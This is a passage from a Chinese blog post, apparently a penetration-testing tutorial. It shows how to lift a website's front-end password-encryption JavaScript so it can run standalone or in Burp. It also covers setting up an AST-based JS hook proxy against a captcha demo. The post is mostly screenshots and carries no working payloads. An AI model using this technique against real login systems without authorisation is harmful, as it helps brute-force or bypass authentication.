<img src="https://pyroxenites.github.io/post-images/1648985643724-52ece0bc-fe50-4e11-937c-3c890c76c678.png" alt="image.png" loading="lazy"><br>
这里我们直接提取加密函数在浏览器中运行<br>
<img src="https://pyroxenites.github.io/post-images/1648985935697-e66780a3-e484-4d24-a696-284788993116.png" alt="image.png" loading="lazy"></p>
<p><img src="https://pyroxenites.github.io/post-images/1648986008444-6bbaf622-dc45-47fc-8406-2ae29e9a72e2.png" alt="image.png" loading="lazy"><br>
发现以及和加密密码一致</p>
<p>这里我们直接将c的值输出一下<br>
<img src="https://pyroxenites.github.io/post-images/1648986703876-b339da0b-a980-42b3-a24c-93f9629ad8fb.png" alt="image.png" loading="lazy"></p>
<blockquote>
<p><a href="https://www.mklab.cn/utils/aes">https://www.mklab.cn/utils/aes</a></p>
</blockquote>
<figure data-type="image" tabindex="12"><img src="https://cdn.nlark.com/yuque/0/2022/png/8363097/1648986681657-ab1df584-36b7-40d4-8e7f-d688ec81f178.png?x-oss-process=image%2Fresize%2Cw_937%2Climit_0#from=url&amp;id=irkFO&amp;originHeight=399&amp;originWidth=937&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></figure>
<p>补充完依赖以后可以直接在js文件运行了<br>
<img src="https://pyroxenites.github.io/post-images/1648986958431-848d25e8-4889-426d-9122-6fed5f76e489.png" alt="image.png" loading="lazy"><br>
提取单独js文件后<br>
也可以在burp中进行加密<br>
<img src="https://pyroxenites.github.io/post-images/1648987186497-156ba87e-c71a-46de-ba5b-ff5f0ac0ec76.png" alt="image.png" loading="lazy"></p>
<h1 id="js-hook">JS hook</h1>
<blockquote>
<p><a href="https://github.com/CC11001100/ast-hook-for-js-RE">https://github.com/CC11001100/ast-hook-for-js-RE</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.geetest.com/demo/click-float.html">https://www.geetest.com/demo/click-float.html</a></p>
</blockquote>
<h2 id="安装依赖">安装依赖</h2>
<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1649136366106-5f498cde-eecf-4ea2-abf7-6ce872975623.png" alt="image.png" loading="lazy"></figure>
<p>开启我们的代理<br>
并安装我们的证书<br>
<img src="https://pyroxenites.github.io/post-images/1649136645901-62e78ecd-0002-427d-9ca6-3df288296d26.png" alt="image.png" loading="lazy"></p>
<p>随后启动代理服务<br>
<img src="https://pyroxenites.github.io/post-images/1649136895595-f6d74047-14cf-40e9-bb21-398ee986ef23.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1649136247471-2c631fc2-58eb-4497-bafe-a31d696d8a76.png" alt="image.png" loading="lazy"><br>
这样我们就可以搜索出现其值得位置</p>
<blockquote>
<p>不过我搜索密码没有成功,不知道问题出在哪里<br>
看别人有成功过的</p>
</blockquote>
<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1649139070865-f3b4c156-daef-49c7-8468-aecca8914266.png" alt="image.png" loading="lazy"></figure>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://pyroxenites.github.io/post/wei-pai-gong-ji/">
              <h3 class="post-title">
                下一篇：委派攻击
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
  <div class="slogan">温故而知新</div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
